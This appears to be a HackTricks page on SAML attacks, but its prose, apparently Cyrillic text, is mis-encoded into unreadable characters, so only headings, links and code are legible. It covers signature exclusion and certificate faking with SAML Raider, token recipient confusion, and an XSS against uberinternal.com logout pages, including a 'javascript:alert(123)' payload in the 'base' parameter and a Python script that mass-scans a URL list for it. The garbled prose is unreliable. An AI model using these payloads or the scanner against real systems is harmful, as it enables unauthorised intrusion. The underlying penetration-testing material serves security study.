–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e), —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ POC –∑ –∑–∞–ø–∏—Ç—É SAML –¥–ª—è —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è –º–æ–∂–ª–∏–≤–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π XSLT.

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–∞–∫–æ–∂ —Ü–µ–π –≤–∏—Å—Ç—É–ø: [https://www.youtube.com/watch?v=WHn-6xHL7mI](https://www.youtube.com/watch?v=WHn-6xHL7mI)

## –í–∏–∫–ª—é—á–µ–Ω–Ω—è –ø—ñ–¥–ø–∏—Å—É XML <a href="#xml-signature-exclusion" id="xml-signature-exclusion"></a>

**–í–∏–∫–ª—é—á–µ–Ω–Ω—è –ø—ñ–¥–ø–∏—Å—É XML** —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—î –∑–∞ –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é —Ä–µ–∞–ª—ñ–∑–∞—Ü—ñ–π SAML, –∫–æ–ª–∏ –µ–ª–µ–º–µ–Ω—Ç –ø—ñ–¥–ø–∏—Å—É –≤—ñ–¥—Å—É—Ç–Ω—ñ–π. –Ø–∫—â–æ —Ü–µ–π –µ–ª–µ–º–µ–Ω—Ç –≤—ñ–¥—Å—É—Ç–Ω—ñ–π, **–ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –ø—ñ–¥–ø–∏—Å—É –º–æ–∂–µ –Ω–µ –≤—ñ–¥–±—É–≤–∞—Ç–∏—Å—è**, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º. –¶–µ –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, –∑–º—ñ–Ω–∏–≤—à–∏ –≤–º—ñ—Å—Ç, —è–∫–∏–π –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –ø—ñ–¥–ø–∏—Å–æ–º.

![https://epi052.gitlab.io/notes-to-self/img/saml/signature-exclusion.svg](<../../.gitbook/assets/image (547).png>)

### –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç <a href="#xml-signature-exclusion-how-to" id="xml-signature-exclusion-how-to"></a>

–í–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [**SAML Raider**](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e). –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å SAML —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å `Remove Signatures`. –ü—Ä–∏ —Ü—å–æ–º—É **–≤—Å—ñ** –µ–ª–µ–º–µ–Ω—Ç–∏ –ø—ñ–¥–ø–∏—Å—É –≤–∏–¥–∞–ª—è—é—Ç—å—Å—è.

–ü—ñ—Å–ª—è –≤–∏–¥–∞–ª–µ–Ω–Ω—è –ø—ñ–¥–ø–∏—Å—ñ–≤ –¥–æ–∑–≤–æ–ª—å—Ç–µ –∑–∞–ø–∏—Ç—É –ø—Ä–æ–¥–æ–≤–∂–∏—Ç–∏ –¥–æ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –æ–±'—î–∫—Ç–∞. –Ø–∫—â–æ –ø—ñ–¥–ø–∏—Å –Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–∏–π –°–µ—Ä–≤—ñ—Å–æ–º

## –ü—ñ–¥—Ä–æ–±–∫–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ <a href="#certificate-faking" id="certificate-faking"></a>

–ü—ñ–¥—Ä–æ–±–∫–∞ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞ - —Ü–µ —Ç–µ—Ö–Ω—ñ–∫–∞ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ —Ç–æ–≥–æ, —á–∏ **–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –°–µ—Ä–≤—ñ—Å—É (SP) –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è SAML –ø—ñ–¥–ø–∏—Å–∞–Ω–µ** –¥–æ–≤—ñ—Ä–µ–Ω–∏–º –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–æ–º –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (IdP). –¶–µ –≤–∫–ª—é—á–∞—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è ***—Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞** –¥–ª—è –ø—ñ–¥–ø–∏—Å—É –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ SAML –∞–±–æ —Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è, —â–æ –¥–æ–ø–æ–º–∞–≥–∞—î –æ—Ü—ñ–Ω–∏—Ç–∏ –ø—Ä–æ—Ü–µ—Å –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –¥–æ–≤—ñ—Ä–∏ –º—ñ–∂ SP —Ç–∞ IdP.

### –Ø–∫ –ø—Ä–æ–≤–µ—Å—Ç–∏ –ø—ñ–¥—Ä–æ–±–∫—É —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞
–ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏ –æ–ø–∏—Å—É—é—Ç—å –ø—Ä–æ—Ü–µ—Å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è Burp [SAML Raider](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e):

1. –ü–µ—Ä–µ—Ö–æ–ø—ñ—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—å SAML.
2. –Ø–∫—â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –º—ñ—Å—Ç–∏—Ç—å –ø—ñ–¥–ø–∏—Å, –Ω–∞–¥—ñ—à–ª—ñ—Ç—å —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –≤ SAML Raider Certs, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–Ω–æ–ø–∫—É `Send Certificate to SAML Raider Certs`.
3. –£ –≤–∫–ª–∞–¥—Ü—ñ SAML Raider Certificates –≤–∏–±–µ—Ä—ñ—Ç—å —ñ–º–ø–æ—Ä—Ç–æ–≤–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç —Ç–∞ –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å `Save and Self-Sign`, —â–æ–± —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π –∫–ª–æ–Ω –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–æ–≥–æ —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–∞.
4. –ü–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –≤ Proxy Burp. –í–∏–±–µ—Ä—ñ—Ç—å –Ω–æ–≤–∏–π —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç –∑—ñ —Å–ø–∏—Å–∫—É –≤–∏–ø–∞–¥–∞—é—á–∏—Ö XML Signature.
5. –í–∏–¥–∞–ª—ñ—Ç—å –±—É–¥—å-—è–∫—ñ —ñ—Å–Ω—É—é—á—ñ –ø—ñ–¥–ø–∏—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–Ω–æ–ø–∫–∏ `Remove Signatures`.
6. –ü—ñ–¥–ø–∏—à—ñ—Ç—å –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∞–±–æ —Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –Ω–æ–≤–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–Ω–æ–ø–∫—É **`(Re-)Sign Message`** –∞–±–æ **`(Re-)Sign Assertion`**, –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ.
7. –ü–µ—Ä–µ—à–ª—ñ—Ç—å –ø—ñ–¥–ø–∏—Å–∞–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –£—Å–ø—ñ—à–Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ —Ç–µ, —â–æ SP –ø—Ä–∏–π–º–∞—î –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –ø—ñ–¥–ø–∏—Å–∞–Ω—ñ –≤–∞—à–∏–º —Å–∞–º–æ–ø—ñ–¥–ø–∏—Å–∞–Ω–∏–º —Å–µ—Ä—Ç–∏—Ñ—ñ–∫–∞—Ç–æ–º, —Ä–æ–∑–∫—Ä–∏–≤–∞—é—á–∏ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ –ø—Ä–æ—Ü–µ—Å—ñ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å SAML.


## –ü–ª—É—Ç–∞–Ω–∏–Ω–∞ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞ —Ç–æ–∫–µ–Ω–∞ / –ü–ª—É—Ç–∞–Ω–∏–Ω–∞ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ —Å–µ—Ä–≤—ñ—Å—É <a href="#token-recipient-confusion" id="token-recipient-confusion"></a>

–ü–ª—É—Ç–∞–Ω–∏–Ω–∞ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞ —Ç–æ–∫–µ–Ω–∞ —Ç–∞ –ø–ª—É—Ç–∞–Ω–∏–Ω–∞ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ —Å–µ—Ä–≤—ñ—Å—É –≤–∫–ª—é—á–∞—é—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É —Ç–æ–≥–æ, —á–∏ **–ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –°–µ—Ä–≤—ñ—Å—É –ø—Ä–∞–≤–∏–ª—å–Ω–æ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–≥–æ –æ—Ç—Ä–∏–º—É–≤–∞—á–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ**. –£ —Å—É—Ç–Ω–æ—Å—Ç—ñ, –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –°–µ—Ä–≤—ñ—Å—É –ø–æ–≤–∏–Ω–µ–Ω –≤—ñ–¥—Ö–∏–ª–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, —è–∫—â–æ –≤–æ–Ω–∞ –±—É–ª–∞ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —ñ–Ω—à–æ–≥–æ –ø–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞. –ö—Ä–∏—Ç–∏—á–Ω–∏–º –µ–ª–µ–º–µ–Ω—Ç–æ–º —Ç—É—Ç —î –ø–æ–ª–µ **Recipient**, —è–∫–µ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –µ–ª–µ–º–µ–Ω—Ç—ñ **SubjectConfirmationData** –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ SAML. –¶–µ –ø–æ–ª–µ –≤–∫–∞–∑—É—î URL, –¥–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–µ. –Ø–∫—â–æ —Ñ–∞–∫—Ç–∏—á–Ω–∏–π –æ—Ç—Ä–∏–º—É–≤–∞—á –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ–º—É –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –°–µ—Ä–≤—ñ—Å—É, —Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è –ø–æ–≤–∏–Ω–Ω–æ –≤–≤–∞–∂–∞—Ç–∏—Å—è –Ω–µ–¥—ñ–π—Å–Ω–∏–º.

#### **–Ø–∫ —Ü–µ –ø—Ä–∞—Ü—é—î**

–î–ª—è —Ç–æ–≥–æ, —â–æ–± –∞—Ç–∞–∫–∞ SAML Token Recipient Confusion (SAML-TRC) –±—É–ª–∞ –º–æ–∂–ª–∏–≤–æ—é, –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø–µ–≤–Ω—ñ —É–º–æ–≤–∏. –ü–æ-–ø–µ—Ä—à–µ, –Ω–∞ –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫—É –°–µ—Ä–≤—ñ—Å—É –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –¥—ñ–π—Å–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å (SP-Legit). –ü–æ-–¥—Ä—É–≥–µ, —Ü—ñ–ª—å–æ–≤–∏–π –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫ –°–µ—Ä–≤—ñ—Å—É (SP-Target) –ø–æ–≤–∏–Ω–µ–Ω –ø—Ä–∏–π–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –≤—ñ–¥ —Ç–æ–≥–æ —Å–∞–º–æ–≥–æ –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó, —è–∫–∏–π –æ–±—Å–ª—É–≥–æ–≤—É—î SP-Legit.

–ü—Ä–æ—Ü–µ—Å –∞—Ç–∞–∫–∏ –ø—Ä–æ—Å—Ç–∏–π –∑–∞ —Ü–∏—Ö —É–º–æ–≤. –Ü–Ω—ñ—Ü—ñ—é—î—Ç—å—Å—è –∞—É—Ç–µ–Ω—Ç–∏—á–Ω–∞ —Å–µ—Å—ñ—è –∑ SP-Legit —á–µ—Ä–µ–∑ —Å–ø—ñ–ª—å–Ω–æ–≥–æ –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ü–µ—Ä–µ—Ö–æ–ø–ª–µ–Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å SAML –≤—ñ–¥ –ü–æ—Å—Ç–∞—á–∞–ª—å–Ω–∏–∫–∞ –Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –¥–æ SP-Legit, —Å–ø–æ—á–∞—Ç–∫—É –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è SP-Legit, –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—î—Ç—å—Å—è –¥–æ SP-Target. –£—Å–ø—ñ—Ö —Ü—ñ—î—ó –∞—Ç–∞–∫–∏ –≤–∏–º—ñ—Ä—é—î—Ç—å—Å—è –ø—Ä–∏–π–Ω—è—Ç—Ç—è–º SP-Target —Ç–≤–µ—Ä–¥–∂–µ–Ω–Ω—è, —â–æ –Ω–∞–¥–∞—î –¥–æ—Å—Ç—É–ø –¥–æ —Ä–µ—Å—É—Ä—Å—ñ–≤ –ø—ñ–¥ —Ç–∏–º —Å–∞–º–∏–º —ñ–º'—è–º –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —è–∫–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–æ—Å—è –¥–ª—è SP-Legit.
```python
# Example to simulate interception and redirection of SAML Response
def intercept_and_redirect_saml_response(saml_response, sp_target_url):
"""
Simulate the interception of a SAML Response intended for SP-Legit and its redirection to SP-Target.

Args:
- saml_response: The SAML Response intercepted (in string format).
- sp_target_url: The URL of the SP-Target to which the SAML Response is redirected.

Returns:
- status: Success or failure message.
"""
# This is a simplified representation. In a real scenario, additional steps for handling the SAML Response would be required.
try:
# Code to send the SAML Response to SP-Target would go here
return "SAML Response successfully redirected to SP-Target."
except Exception as e:
return f"Failed to redirect SAML Response: {e}"
```
## XSS —É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—ñ –≤–∏—Ö–æ–¥—É

–û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–µ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è –º–æ–∂–Ω–∞ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –∑–∞ [—Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/).

–ü—ñ–¥ —á–∞—Å –ø—Ä–æ—Ü–µ—Å—É –ø–µ—Ä–µ–±–æ—Ä—É –∫–∞—Ç–∞–ª–æ–≥—ñ–≤ –±—É–ª–∞ –≤–∏—è–≤–ª–µ–Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –≤–∏—Ö–æ–¥—É –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:
```
https://carbon-prototype.uberinternal.com:443/oidauth/logout
```
–ü—ñ—Å–ª—è –¥–æ—Å—Ç—É–ø—É –∑–∞ —Ü–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –≤—ñ–¥–±—É–ª–æ—Å—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –Ω–∞:
```
https://carbon-prototype.uberinternal.com/oidauth/prompt?base=https%3A%2F%2Fcarbon-prototype.uberinternal.com%3A443%2Foidauth&return_to=%2F%3Fopenid_c%3D1542156766.5%2FSnNQg%3D%3D&splash_disabled=1
```
–¶–µ –≤–∏—è–≤–∏–ª–æ—Å—è, —â–æ –ø–∞—Ä–∞–º–µ—Ç—Ä `base` –ø—Ä–∏–π–º–∞—î URL-–∞–¥—Ä–µ—Å—É. –í—Ä–∞—Ö–æ–≤—É—é—á–∏ —Ü–µ, –≤–∏–Ω–∏–∫–ª–∞ —ñ–¥–µ—è –∑–∞–º—ñ–Ω–∏—Ç–∏ URL-–∞–¥—Ä–µ—Å—É –Ω–∞ `javascript:alert(123);` —É —Å–ø—Ä–æ–±—ñ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ –∞—Ç–∞–∫—É XSS (–º—ñ–∂—Å–∞–π—Ç–æ–≤–∏–π —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥).


### –ú–∞—Å–æ–≤–∞ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

[–ó —Ü—å–æ–≥–æ –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/):

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [**SAMLExtractor**](https://github.com/fadyosman/SAMLExtractor) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤—Å—è –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É –ø—ñ–¥–¥–æ–º–µ–Ω—ñ–≤ `uberinternal.com` –¥–ª—è –¥–æ–º–µ–Ω—ñ–≤, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ç—É –∂ —Å–∞–º—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ –±—É–≤ —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Å–ø—Ä—è–º—É–≤–∞–Ω–Ω—è –Ω–∞ —Å—Ç–æ—Ä—ñ–Ω–∫—É `oidauth/prompt`. –¶–µ–π —Å–∫—Ä–∏–ø—Ç –ø–µ—Ä–µ–≤—ñ—Ä—è—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å XSS (–º—ñ–∂—Å–∞–π—Ç–æ–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∏–Ω–≥—É), –≤–≤–æ–¥—è—á–∏ –¥–∞–Ω—ñ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏, —á–∏ –≤–æ–Ω–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è —É –≤–∏–≤–µ–¥–µ–Ω–Ω—ñ. –£ –≤–∏–ø–∞–¥–∫–∞—Ö, –∫–æ–ª–∏ –≤–≤–µ–¥–µ–Ω—ñ –¥–∞–Ω—ñ –¥—ñ–π—Å–Ω–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å—Å—è, —Å–∫—Ä–∏–ø—Ç –ø–æ–∑–Ω–∞—á–∞—î —Å—Ç–æ—Ä—ñ–Ω–∫—É —è–∫ –≤—Ä–∞–∑–ª–∏–≤—É.
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from colorama import init ,Fore, Back, Style
init()

with open("/home/fady/uberSAMLOIDAUTH") as urlList:
for url in urlList:
url2 = url.strip().split("oidauth")[0] + "oidauth/prompt?base=javascript%3Aalert(123)%3B%2F%2FFady&return_to=%2F%3Fopenid_c%3D1520758585.42StPDwQ%3D%3D&splash_disabled=1"
request = requests.get(url2, allow_redirects=True,verify=False)
doesit = Fore.RED + "no"
if ("Fady" in request.content):
doesit = Fore.GREEN + "yes"
print(Fore.WHITE + url2)
print(Fore.WHITE + "Len : " + str(len(request.content)) + "   Vulnerable : " + doesit)
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/)
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/)\
* [https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/](https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/)
* [https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/](https://blog.fadyothman.com/how-i-discovered-xss-that-affects-over-20-uber-subdomains/)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>
